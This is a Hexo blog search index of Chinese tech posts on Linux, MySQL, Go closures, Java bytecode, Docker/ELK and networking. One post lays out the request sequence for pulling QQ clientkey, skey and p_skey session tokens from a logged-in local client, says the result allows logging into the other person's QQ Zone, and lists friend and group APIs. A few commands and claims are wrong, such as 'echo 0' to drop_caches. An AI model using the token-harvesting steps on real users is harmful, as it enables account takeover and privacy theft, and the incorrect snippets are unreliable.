<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Linux释放内存]]></title>
    <url>%2F2019%2F09%2F30%2FLinux%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98%2F</url>
    <content type="text"><![CDATA[查看内存1free -h 释放内存可用内存为：free + buff/caches的 1234# 写缓存到文件系统sync# 释放内存echo 0 &gt; /proc/sys/vm/drop_caches]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>free</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos配置优化]]></title>
    <url>%2F2019%2F09%2F30%2FCentos%E9%85%8D%E7%BD%AE%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[1. 升级内核 目前默认的内核都是 3.10的，我们需要升级到4.4 查看内核版本 1uname -r 升级 123456rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm yum --enablerepo=elrepo-kernel install kernel-lt -y cat /boot/grub2/grub.cfg |grep menuentry grub2-set-default 'CentOS Linux (4.4.177-1.el7.elrepo.x86_64) 7 (Core)' reboot 再次查看当前内核 1uname -r 移除无用内核 1234567yum remove -y kernel*yum remove -y kernel-tools-libs yum --enablerepo=elrepo-kernel install --skip-broken -y kernel-lt-headers kernel-lt-tools kernel-lt-develyum --enablerepo=elrepo-kernel install -y perf python-perf 2. 字体优化有时候可能中文显示会出现问题，这里我们将字体编码改为UTF-8 123456789cat &gt;&gt; /etc/profile &lt;&lt;EOFexport LC_ALL=en_US.UTF-8export LC_CTYPE=en_US.UTF-8EOFcat &gt;&gt; /etc/environment &lt;&lt;EOFLANG=en_US.utf-8LC_ALL=en_US.utf-8EOF 刷新生效 12source /ect/profilesource /etc/environment 3. 进程限制优化 查看进行限制 1cat /etc/security/limits.d/20-nproc.conf_bk 修改限制 你可以加大限制，也可以改为 unlimited,让其不限制进程 1vim /etc/security/limits.d/20-nproc.conf_bk 4. 时区优化 查看当前使用时区 1timedatectl | grep "Time zone" 修改时区这里我们修改为上海的时区 1ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 5. 文件打开数优化 我们可以增大或减小文件的打开数，来优化我们系统的运行效率 1vim /etc/serurity/limits.conf 6. 增加用户的操作日志记录 将文件添加到/etc/profile中 1234567891011121314151617181920cat &gt;&gt; /etc/profile &lt;&lt;EOFhistoryUSER=`whoami`USER_IP=`who -u am i 2&gt;/dev/null| awk '&#123;print $NF&#125;'|sed -e 's/[()]//g'`if [ "$USER_IP" = "" ]; thenUSER_IP=`hostname`fiif [ ! -d /var/log/history ]; thenmkdir /var/log/historychmod 777 /var/log/historyfiif [ ! -d /var/log/history/$&#123;LOGNAME&#125; ]; thenmkdir /var/log/history/$&#123;LOGNAME&#125;chmod 300 /var/log/history/$&#123;LOGNAME&#125;fiexport HISTSIZE=4096DT=`date +"%Y%m%d_%H:%M:%S"`export HISTFILE="/var/log/history/$&#123;LOGNAME&#125;/$&#123;USER&#125;@$&#123;USER_IP&#125;_$DT"chmod 600 /var/log/history/$&#123;LOGNAME&#125;/*history* 2&gt;/dev/nullEOF 使命令生效 1source /etc/profile 查看日志 登录，登出之后在 /var/log/history中就可以看到以用户命名的文件夹，进入之后就会显示所有的日志操作 7. 日志优化压缩日志，将compress的注释删掉 1vim /etc/logrotate.conf]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>优化</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL字段操作]]></title>
    <url>%2F2019%2F09%2F30%2FMySQL%E5%AD%97%E6%AE%B5%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[添加列 1ALTER TABLE 表名 add COLUMN 列名 VARCHAR(2) DEFAULT NULL COMMENT '注释'; 删除列 1alter table 表名 drop column 列名; 更新列名 1alter table 表名 change 列名 新列名 varchar(30); 修改列属性 1alter table 表名 modify 列名 varchar(22); 修改字段默认值 1alter table 表名 alter 字段名 set default 1000; 删除字段默认值 1alter table 表名 alter 列名 drop default; 修改表名 1alter table 表名 rename to 新表名;]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Go语言入门（6）闭包]]></title>
    <url>%2F2019%2F09%2F24%2FGo%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%EF%BC%886%EF%BC%89%E9%97%AD%E5%8C%85%2F</url>
    <content type="text"><![CDATA[转载自：https://blog.csdn.net/zhangzhebjut/article/details/25181151 一 函数式编程概论在过去近十年时间里，面向对象编程大行其道，以至于在大学的教育里，老师也只会教给我们两种编程模型，面向过程和面向对象。孰不知，在面向对象思想产生之前，函数式编程已经有了数十年的历史。就让我们回顾这个古老又现代的编程模型，看看究竟是什么魔力将这个概念在21世纪的今天再次拉入我们的视野。 随着硬件性能的提升以及编译技术和虚拟机技术的改进，一些曾被性能问题所限制的动态语言开始受到关注，Python、Ruby 和 Lua 等语言都开始在应用中崭露头角。动态语言因其方便快捷的开发方式成为很多人喜爱的编程语言，伴随动态语言的流行，函数式编程也再次进入了我们的视野。 究竟什么是函数式编程呢？ 在维基百科中，对函数式编程有很详细的介绍。Wiki上对Functional Programming的定义： In computer science, functional programming is a programming paradigm that treats computation as the evaluation of mathematical functions and avoids state and mutable data. 简单地翻译一下，也就是说函数式编程是一种编程模型，他将计算机运算看做是数学中函数的计算，并且避免了状态以及变量的概念。 二 闭包在函数编程中经常用到闭包，闭包是什么？它是怎么产生的及用来解决什么问题呢?先给出闭包的字面定义：闭包是由函数及其相关引用环境组合而成的实体(即：闭包=函数+引用环境)。这个从字面上很难理解，特别对于一直使用命令式语言进行编程的程序员们。 闭包只是在形式和表现上像函数，但实际上不是函数。函数是一些可执行的代码，这些代码在函数被定义后就确定了，不会在执行时发生变化，所以一个函数只有一个实例。闭包在运行时可以有多个实例，不同的引用环境和相同的函数组合可以产生不同的实例。所谓引用环境是指在程序执行中的某个点所有处于活跃状态的约束所组成的集合。其中的约束是指一个变量的名字和其所代表的对象之间的联系。那么为什么要把引用环境与函数组合起来呢？这主要是因为在支持嵌套作用域的语言中，有时不能简单直接地确定函数的引用环境。这样的语言一般具有这样的特性： 函数是一等公民（First-class value），即函数可以作为另一个函数的返回值或参数，还可以作为一个变量的值。函数可以嵌套定义，即在一个函数内部可以定义另一个函数。 在面向对象编程中，我们把对象传来传去，那在函数式编程中，要做的是把函数传来传去，说成术语，把他叫做高阶函数。在数学和计算机科学中，高阶函数是至少满足下列一个条件的函数: 接受一个或多个函数作为输入 输出一个函数 在函数式编程中，函数是基本单位，是第一型，他几乎被用作一切，包括最简单的计算，甚至连变量都被计算所取代。 闭包小结:函数只是一段可执行代码，编译后就“固化”了，每个函数在内存中只有一份实例，得到函数的入口点便可以执行函数了。在函数式编程语言中，函数是一等公民（First class value）：第一类对象，我们不需要像命令式语言中那样借助函数指针，委托操作函数，函数可以作为另一个函数的参数或返回值，可以赋给一个变量。函数可以嵌套定义，即在一个函数内部可以定义另一个函数，有了嵌套函数这种结构，便会产生闭包问题。如： 12345678910111213141516171819202122package main import ( "fmt") func adder() func(int) int &#123; sum := 0 innerfunc := func(x int) int &#123; sum += x return sum &#125; return innerfunc&#125; func main() &#123; pos, neg := adder(), adder() for i := 0; i &lt; 10; i++ &#123; fmt.Println(pos(i), neg(-2*i)) &#125; &#125; 在这段程序中，函数innerfunc是函数adder的内嵌函数，并且是adder函数的返回值。我们注意到一个问题：内嵌函数innerfunc中引用到外层函数中的局部变量sum，Go会这么处理这个问题呢？先让我们来看看这段代码的运行结果： 123456789100 0 1 -2 3 -6 6 -12 10 -20 15 -30 21 -42 28 -56 36 -72 45 -90 注意: Go不能在函数内部显式嵌套定义函数，但是可以定义一个匿名函数。如上面所示，我们定义了一个匿名函数对象，然后将其赋值给innerfunc，最后将其作为返回值返回。 当用不同的参数调用adder函数得到（pos(i)，neg(i)）函数时，得到的结果是隔离的，也就是说每次调用adder返回的函数都将生成并保存一个新的局部变量sum。其实这里adder函数返回的就是闭包。这个就是Go中的闭包，一个函数和与其相关的引用环境组合而成的实体。一句关于闭包的名言: 对象是附有行为的数据，而闭包是附有数据的行为。 三 闭包使用闭包经常用于回调函数，当IO操作（例如从网络获取数据、文件读写)完成的时候，会对获取的数据进行某些操作，这些操作可以交给函数对象处理。 除此之外，在一些公共的操作中经常会包含一些差异性的特殊操作，而这些差异性的操作可以用函数来进行封装。看下面的例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125package main import ( "errors" "fmt") type Traveser func(ele interface&#123;&#125;)/* Process:封装公共切片数组操作*/func Process(array interface&#123;&#125;, traveser Traveser) error &#123; if array == nil &#123; return errors.New("nil pointer") &#125; var length int //数组的长度 switch array.(type) &#123; case []int: length = len(array.([]int)) case []string: length = len(array.([]string)) case []float32: length = len(array.([]float32)) default: return errors.New("error type") &#125; if length == 0 &#123; return errors.New("len is zero.") &#125; traveser(array) return nil&#125;/* 具体操作:升序排序数组元素*/func SortByAscending(ele interface&#123;&#125;) &#123; intSlice, ok := ele.([]int) if !ok &#123; return &#125; length := len(intSlice) for i := 0; i &lt; length-1; i++ &#123; isChange := false for j := 0; j &lt; length-1-i; j++ &#123; if intSlice[j] &gt; intSlice[j+1] &#123; isChange = true intSlice[j], intSlice[j+1] = intSlice[j+1], intSlice[j] &#125; &#125; if isChange == false &#123; return &#125; &#125;&#125;/* 具体操作:降序排序数组元素*/func SortByDescending(ele interface&#123;&#125;) &#123; intSlice, ok := ele.([]int) if !ok &#123; return &#125; length := len(intSlice) for i := 0; i &lt; length-1; i++ &#123; isChange := false for j := 0; j &lt; length-1-i; j++ &#123; if intSlice[j] &lt; intSlice[j+1] &#123; isChange = true intSlice[j], intSlice[j+1] = intSlice[j+1], intSlice[j] &#125; &#125; if isChange == false &#123; return &#125; &#125;&#125; func main() &#123; intSlice := make([]int, 0) intSlice = append(intSlice, 3, 1, 4, 2) Process(intSlice, SortByDescending) fmt.Println(intSlice) //[4 3 2 1] Process(intSlice, SortByAscending) fmt.Println(intSlice) //[1 2 3 4] stringSlice := make([]string, 0) stringSlice = append(stringSlice, "hello", "world", "china") /* 具体操作:使用匿名函数封装输出操作 */ Process(stringSlice, func(elem interface&#123;&#125;) &#123; if slice, ok := elem.([]string); ok &#123; for index, value := range slice &#123; fmt.Println("index:", index, " value:", value) &#125; &#125; &#125;) floatSlice := make([]float32, 0) floatSlice = append(floatSlice, 1.2, 3.4, 2.4) /* 具体操作:使用匿名函数封装自定义操作 */ Process(floatSlice, func(elem interface&#123;&#125;) &#123; if slice, ok := elem.([]float32); ok &#123; for index, value := range slice &#123; slice[index] = value * 2 &#125; &#125; &#125;) fmt.Println(floatSlice) //[2.4 6.8 4.8]&#125; 输出结果: 123456[4 3 2 1] [1 2 3 4]index: 0 value: helloindex: 1 value: worldindex: 2 value: china[2.4 6.8 4.8] 在上面的例子中，Process函数负责对切片(数组）数据进行操作，在操作切片(数组)时候，首先要做一些参数检测，例如指针是否为空、数组长度是否大于0等。这些是操作数据的公共操作。具体针对数据可以有自己特殊的操作，包括排序(升序、降序）、输出等。针对这些特殊的操作可以使用函数对象来进行封装。再看下面的例子，这个例子没什么实际意义，只是为了说明闭包的使用方式。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package main import ( "fmt") type FilterFunc func(ele interface&#123;&#125;) interface&#123;&#125; /* 公共操作:对数据进行特殊操作*/func Data(arr interface&#123;&#125;, filterFunc FilterFunc) interface&#123;&#125; &#123; slice := make([]int, 0) array, _ := arr.([]int) for _, value := range array &#123; integer, ok := filterFunc(value).(int) if ok &#123; slice = append(slice, integer) &#125; &#125; return slice&#125;/* 具体操作:奇数变偶数（这里可以不使用接口类型,直接使用int类型)*/func EvenFilter(ele interface&#123;&#125;) interface&#123;&#125; &#123; integer, ok := ele.(int) if ok &#123; if integer%2 == 1 &#123; integer = integer + 1 &#125; &#125; return integer&#125;/* 具体操作:偶数变奇数（这里可以不使用接口类型,直接使用int类型)*/func OddFilter(ele interface&#123;&#125;) interface&#123;&#125; &#123; integer, ok := ele.(int) if ok &#123; if integer%2 != 1 &#123; integer = integer + 1 &#125; &#125; return integer&#125; func main() &#123; sliceEven := make([]int, 0) sliceEven = append(sliceEven, 1, 2, 3, 4, 5) sliceEven = Data(sliceEven, EvenFilter).([]int) fmt.Println(sliceEven) //[2 2 4 4 6] sliceOdd := make([]int, 0) sliceOdd = append(sliceOdd, 1, 2, 3, 4, 5) sliceOdd = Data(sliceOdd, OddFilter).([]int) fmt.Println(sliceOdd) //[1 3 3 5 5] &#125; 输出结果: 12[2 2 4 4 6] [1 3 3 5 5] Data作为公共函数，然后分别定义了两个具体的特殊函数:偶数和奇数的过滤器，定义具体的操作。 四 总结上面例子中闭包的使用有点类似于面向对象设计模式中的模版模式，在模版模式中是在父类中定义公共的行为执行序列，然后子类通过重载父类的方法来实现特定的操作，而在Go语言中我们使用闭包实现了同样的效果。 其实理解闭包最方便的方法就是将闭包函数看成一个类 ,一个闭包函数调用就是实例化一个类（在Objective-c中闭包就是用类来实现的），然后就可以从类的角度看出哪些是全局变量，哪些是局部变量。例如在第一个例子中，pos和neg分别实例化了两个闭包类，在这个闭包类中有个闭包全局变量sum。所以这样就很好理解返回的结果了。 参考:http://www.ibm.com/developerworks/cn/linux/l-cn-closure/index.html]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QQ快速登录协议分析]]></title>
    <url>%2F2019%2F09%2F22%2FQQ%E5%BF%AB%E9%80%9F%E7%99%BB%E5%BD%95%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[1.获取pt_local_token请求 https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https%3A%2F%2Fhuifu.qq.com%2Findex.html&amp;style=20&amp;appid=715021417&amp;proxy_url=https%3A%2F%2Fhuifu.qq.com%2Fproxy.html 在header的Set-Cookie中记录着该值 2. 获取本机所登陆的QQ号码请求 https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.6694805047494219&amp;pt_local_tk=`pt_local_tk` 请求头带入Referer，Cookie带入pt_local_token=第一步得到的值端口是从4000~4008之间的，不确定哪一个 referer： https://xui.ptlogin2.qq.com/cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=549000912&amp;style=22&amp;target=self&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1 返回数据 var var_sso_uin_list=[{“account”:”Q号”,”client_type”:65793,”face_index”:144,”gender”:1,”nickname”:”Blue”,”uin”:”QQ号”,”uin_flag”:4194822}];ptui_getuins_CB(var_sso_uin_list); 3. 获取clientkey请求： https://localhost.ptlogin2.qq.com:4301/pt_get_st?clientuin=`QQ号`&amp;callback=ptui_getst_CB&amp;r=0.7284667321181328&amp;pt_local_tk=-1806654417 请求头带入Referer，Cookie带入pt_local_token=第一步得到的值 clientkey还是在response中的header的Set-Cookie中 4. 获取skey,uin请求 https://ssl.ptlogin2.qq.com/jump?clientuin=`clientuin`&amp;keyindex=9&amp;pt_aid=715021417&amp;u1=https%3A%2F%2Fhuifu.qq.com%2Findex.html&amp;pt_local_tk=`pt_local_tk`&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=40 请求头带入referer和cookie。cookie需要带入pt_local_token、clientuin、clientkey等关键参数。 skey，uin还是在response中的header的Set-Cookie中 另外此请求返回数据中有一个URL，其实用这个URL就可以直接登录对方的QQ空间了。URL 大概下面这样子 ptui_qlogin_CB(‘0’, ‘https://ptlogin2.qzone.qq.com/check_sig?pttype=2&amp;uin=QQ号&amp;service=jump&amp;nodirect=0&amp;ptsigx=06bbcd374ab3c5df7d26d1493f9a6364895db2999b5cb25a3fcf208213a7211c3848716312355f3cb98c44626c6f3fda428d7e4e09f196e1ace0c26f3acd7620&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone%26specifyurl%3Dhttp%253A%252F%252Fuser.qzone.qq.com%252FQ号&amp;f_url=&amp;ptlang=2052&amp;ptredirect=100&amp;aid=1000101&amp;daid=5&amp;j_later=0&amp;low_login_hour=0&#174;master=0&amp;pt_login_type=2&amp;pt_aid=549000912&amp;pt_aaid=0&amp;pt_light=0&amp;pt_3rd_aid=0&#39;, ‘’) 5. 获取p_skey请求 https://ssl.ptlogin2.qq.com/jump?clientuin=`clientuin`&amp;keyindex=9&amp;pt_aid=549000912&amp;daid=5&amp;u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_local_tk=1543159096&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=40&amp;has_onekey=1 请求头带入referer和cookie。cookie需要带入pt_local_token 特别注意：p_skey是在response的Request的Response的Header中 为防止别人恶意传播，此处就不贴代码了。我把源码放我公众号上了，喜欢研究的朋友可以去取一下，回复： QQ快速登录 即可获取 再放几个常用的接口： 1. 获取QQ全部好友与分组接口：https://qun.qq.com/cgi-bin/qun_mgr/get_friend_listPOST请求Header中加入cookie，cookie中带入这三个值：uin=; skey=;p_skey=Body中带入：bkn=g_tkg_tk是通过skey经过算法计算出来了，源码中有这个算法 2. QQ群列表接口：https://qun.qq.com/cgi-bin/qun_mgr/get_group_listPOST请求Header中加入cookie，cookie中带入这三个值：uin=; skey=;p_skey=Body中带入：bkn=g_tk 3. 获取某个群的群成员接口：https://qun.qq.com/cgi-bin/qun_mgr/search_group_membersPOST请求 Header中加入cookie，cookie中带入这三个值：uin=; skey=;p_skey=POST参数：bkn=;gc=群号;sort=0;st=起始位置;end=结束位置其中end为要获取多少个，st为获取成员的起始位置]]></content>
      <categories>
        <category>爬虫相关,渗透</category>
      </categories>
      <tags>
        <tag>qq</tag>
        <tag>QQ快速登录</tag>
        <tag>pskey</tag>
        <tag>skey</tag>
        <tag>g_tk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改Java字节码]]></title>
    <url>%2F2019%2F09%2F22%2F%E4%BF%AE%E6%94%B9Java%E5%AD%97%E8%8A%82%E7%A0%81%2F</url>
    <content type="text"><![CDATA[下载工具asmtools下载链接：https://pan.baidu.com/s/1iNHJKK9Ndsag_gqi2PYAkQ提取码：72ke 操作字节1234567891011public class Foo &#123; public static void main(String[] args) &#123; boolean flag = true; if (flag) &#123; System.out.println("Hello, Java!"); &#125; if (flag == true) &#123; System.out.println("Hello, JVM!"); &#125; &#125;&#125; 当我们编译后直接运行会打印出 12Hello, Java!Hello, JVM! 我们知道，boolean类型在虚拟机是以int方式进行存储的，0是false，1是true，可当我们通过修改字节码的方式，让flag等于2 会发生什么，跟着我下面的步骤一起来看看吧 先编译Foo 1javac Foo.java 通过字节码工具反编译 1java -jar asmtools.jar jdis Foo.class &gt; Foo.jasm.1 修改flag的字节码 1awk 'NR==1, /iconst_1/&#123;sub(/iconst_1/,"iconst_2")&#125; 1' Foo.jasm.1 &gt; Foo.jasm 将jasm反编译的再次编译为class文件 1java -jar asmtools.jar jasm Foo.jasm 运行Foo.class 1java Foo 我们会发现只打印出了 1Hello, Java! 我们发现 第二个if不成立了，第一个还是成立，这是因为当我们直接进行 if(flag) 是按java虚拟机的翻译就是 当flag不等于0时则成立 而 if(flag==true) 则被虚拟机认为 当flag等于1是才成立，而我们将flag改为了2，这时第一个还是不等于0，所以成立，而第一个判断语句而不等于1了所以条件不成立。 PS: 当我们把flag改为3呢，第二个条件会成立吗？答案是：会成立，很有意思是吧，这是因为java虚拟机在内部是截取的最低位来判断的，2转换为2进制为 0010 截取最低位就是 0，而 3 转为 二进制为0001，最低位为1 另外，awk命令详细文档：https://blog.csdn.net/jiaobuchong/article/details/83037467]]></content>
      <categories>
        <category>Java,JVM</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>asmtools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker安装使用ELK]]></title>
    <url>%2F2019%2F09%2F20%2Fdocker%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8ELK%2F</url>
    <content type="text"><![CDATA[1. 安装docker Docker 分为 CE 和 EE 两大版本。CE 即社区版（免费），EE 即企业版，强调安全，付费使用，这里我们使用的CE版 为了确保系统的稳定性，建议先update一下 1sudo yum update 安装依赖包 1sudo yum install -y yum-utils device-mapper-persistent-data lvm2 添加docker镜像 1sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 如果官方源下载速度太慢，建议使用国内源 1sudo yum-config-manager --add-repo https://mirrors.ustc.edu.cn/docker-ce/linux/centos/docker-ce.repo 安装docker 12sudo yum makecache fastsudo yum install docker-ce 测试是否安装成功 1docker run hello-world 建立一个docker组，并将当前用户加入到此组中，这样不用root用户即可访问到 Docker 引擎的 Unix socket 1234# 创建docker组sudo groupadd docker# 将当前用户加入到组中sudo usermod -aG docker $USER 如果上面安装失败，我们可以卸载docker，重新安装 12345678910sudo yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-selinux \ docker-engine-selinux \ docker-engine 2. 安装docker-compose docker-compose是一个docker编排工具，它可以有效的解决我们镜像之间的依赖关系 这里提供两种方式安装： 直接下载 下载docker-compose文件 1curl -L "https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose 赋予文件可执行权限 1sudo chmod +x /usr/local/bin/docker-compose 验证是否安装成功 1docker-compose version pip方式安装 安装pip 12345678#安装依赖yum -y install epel-release#安装pipyum -y install python-pip#更新pippip install --upgrade pip# 验证pippip --version 安装docker-compose 1pip install -U docker-compose==1.23.2 验证安装是否成功 1docker-compose version 3. 安装ELKC ELKC为 elasticsearch（搜索型数据库）、logstash（日志搜集、过滤、分析）、kibana（提供Web页面分析日志）、cerebro（监控elasticsearch状态） docker-compose.yml 文件如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374version: '2.2'services: # elasticsearch节点1 elasticsearch: image: docker.elastic.co/elasticsearch/elasticsearch:7.1.0 container_name: es7_01 environment: - cluster.name=pibigstar - node.name=es7_01 - bootstrap.memory_lock=true - "ES_JAVA_OPTS=-Xms512m -Xmx512m" - discovery.seed_hosts=es7_01 - cluster.initial_master_nodes=es7_01,es7_02 ulimits: memlock: soft: -1 hard: -1 volumes: - es7data1:/usr/share/elasticsearch/data ports: - 9200:9200 networks: - es7net # elasticsearch节点2 elasticsearch2: image: docker.elastic.co/elasticsearch/elasticsearch:7.1.0 container_name: es7_02 environment: - cluster.name=pibigstar - node.name=es7_02 - bootstrap.memory_lock=true - "ES_JAVA_OPTS=-Xms512m -Xmx512m" - discovery.seed_hosts=es7_01 - cluster.initial_master_nodes=es7_01,es7_02 ulimits: memlock: soft: -1 hard: -1 volumes: - es7data2:/usr/share/elasticsearch/data networks: - es7net# kibana kibana: image: docker.elastic.co/kibana/kibana:7.1.0 container_name: kibana7 environment: - I18N_LOCALE=zh-CN - XPACK_GRAPH_ENABLED=true - TIMELION_ENABLED=true - XPACK_MONITORING_COLLECTION_ENABLED="true" ports: - "5601:5601" networks: - es7net# cerebro cerebro: image: lmenezes/cerebro:0.8.3 container_name: cerebro ports: - "9000:9000" command: - -Dhosts.0.host=http://elasticsearch:9200 networks: - es7netvolumes: es7data1: driver: local es7data2: driver: localnetworks: es7net: driver: bridge 启动 1docker-compose up 注意： 1、如果你看到这个提示：max virtual memory areas vm.max_map_count [65530] is too low, increase to at least”那说明你设置的 max_map_count 小了，编辑/etc/sysctl.conf，追加以下内容：vm.max_map_count=262144保存后，执行：sysctl -p重新启动。 2、如果启动过程中出现问题，关闭后再次启动前要先清除下数据 1234# 停止容器并且移除数据docker-compose down -v# 再次启动docker-compose up kibnan页面：http://localhost:5601 cretebro页面：http://localhost:9000 4. 启动Logstash 下载测试数据http://files.grouplens.org/datasets/movielens/ml-latest-small.zip 下载Logstash https://www.elastic.co/cn/downloads/logstash 配置logstash.conf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546input &#123; file &#123; path =&gt; [&quot;F:/elasticsearch/ml-latest-small/movies.csv&quot;] start_position =&gt; &quot;beginning&quot; sincedb_path =&gt; &quot;nul&quot; &#125;&#125;filter &#123; csv &#123; separator =&gt; &quot;,&quot; columns =&gt; [&quot;id&quot;,&quot;content&quot;,&quot;genre&quot;] &#125; mutate &#123; split =&gt; &#123; &quot;genre&quot; =&gt; &quot;|&quot; &#125; remove_field =&gt; [&quot;path&quot;, &quot;host&quot;,&quot;@timestamp&quot;,&quot;message&quot;] &#125; mutate &#123; split =&gt; [&quot;content&quot;, &quot;(&quot;] add_field =&gt; &#123; &quot;title&quot; =&gt; &quot;%&#123;[content][0]&#125;&quot;&#125; add_field =&gt; &#123; &quot;year&quot; =&gt; &quot;%&#123;[content][1]&#125;&quot;&#125; &#125; mutate &#123; convert =&gt; &#123; &quot;year&quot; =&gt; &quot;integer&quot; &#125; strip =&gt; [&quot;title&quot;] remove_field =&gt; [&quot;path&quot;, &quot;host&quot;,&quot;@timestamp&quot;,&quot;message&quot;,&quot;content&quot;] &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; &quot;http://localhost:9200&quot; index =&gt; &quot;movies&quot; document_id =&gt; &quot;%&#123;id&#125;&quot; &#125; stdout &#123;&#125;&#125; 启动logstash 12cd binlogstash -f F:\elasticsearch\conf\logstash.cnf]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elasticsearch</tag>
        <tag>docker-compose</tag>
        <tag>logstash</tag>
        <tag>kibana</tag>
        <tag>cerebro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试总结---网络部分]]></title>
    <url>%2F2019%2F09%2F17%2F%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93---%E7%BD%91%E7%BB%9C%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[[TOC] 1. 浏览器发送一个请求经历了那些过程 输入URL，浏览器解析出domain 将domain发送给DNS解析器解析出IP地址1返回给浏览器 将IP地址和请求参数封装到数据报中 发起TCP的三次握手 建立TCP链接后发送http请求（数据报） 服务器处理请求并返回Response http 协议属于应用层协议，http 基于 tcp 协议，所以 client 与 server 主要通过 socket 进行通讯 用户首先在浏览器输入请求的url地址，浏览器内部的核心代码会将这个url进行拆分解析，最终将domain发送到DNS服务器上，DNS服务器会根据domain去查询相关对于的ip地址，从而将IP地址返回给浏览器，浏览器持有ip地址后就会知道这个请求是要发送到哪个地方（哪个服务器上），然后跟随协议，将ip地址打在协议中，并且请求的相关的参数都会在协议中携带，最终发送到网络中去然后经过我们自己的局域网——交换机——路由器——主干网络——最终到达服务端 服务端是有个MVC架构的请求会首先进入到Controller中进行相关的逻辑处理和请求的分发——调用Model层（负责和数据进行交互）数据交互的过程中Model会去读取redis和数据库里面的数据——获取到数据之后叫渲染好的页面通过View层返回给网络这时候一个HTTP请求的Response又从服务端返回到浏览器，浏览器做一个render的过程（就是根据请求回来的html以及这个html所关联的css，js去进行渲染的过程，那么渲染的过程中浏览器会根据html去形成相关的dom树以及对应的css树，然后对dom树和css树进行整合，最终知道某个dom节点知道需要什么样的样式，从而进行样式的渲染）样式渲染完成之后，浏览器会进一步去执行下面的js脚本，执行动态的页面的能力，从而最终的页面就在浏览器中展现出来了 1.1 TCP连接过程中的三次握手和四次挥手 序号：Seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。 确认序号：Ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，Ack=Seq+1。 标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下： URG：紧急指针（urgent pointer）有效。 ACK：确认序号有效。 PSH：接收方应该尽快将这个报文交给应用层。 RST：重置连接。 SYN：发起一个新连接。 FIN：释放一个连接。 1.11 三次握手 第一次握手：Client将标志位SYN置为1，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。 第二次握手：Server收到数据包后由标志位SYN=1知道Client请求建立连接，Server将标志位SYN和ACK都置为1，ack (number )=J+1，随机产生一个值seq=K，并将该数据包发送给Client以确认连接请求，Server进入SYN_RCVD状态。 第三次握手：Client收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给Server，Server检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。 1.12 四次挥手断开连接端可以是Client端，也可以是Server端。假设Client端发起中断连接请求： 